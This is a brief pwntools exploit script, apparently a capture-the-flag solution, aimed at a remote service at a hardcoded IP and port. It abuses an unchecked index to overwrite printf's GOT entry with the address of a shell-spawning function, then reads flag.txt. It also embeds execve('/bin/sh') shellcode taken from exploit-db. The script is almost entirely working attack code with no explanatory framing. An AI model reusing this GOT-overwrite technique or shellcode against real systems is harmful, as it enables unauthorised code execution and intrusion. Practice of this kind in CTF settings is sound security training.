from pwn import *

r = remote('140.110.112.218', 3113)

# https://www.exploit-db.com/shellcodes/46907
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" 

# ID  
# fgets(obj.user + id * 8)
# obj.user + id * 8 = printf_got
obj_user   = 0x6010c0
printf_got = 0x601028
id = (printf_got - obj_user) // 8
r.recvuntil(":")
r.sendline(str(id))

# # Nickname
admini_shell = 0x00400924
r.recvuntil(":")
r.sendline(p64(admini_shell))
r.sendline("cat flag.txt")

r.interactive()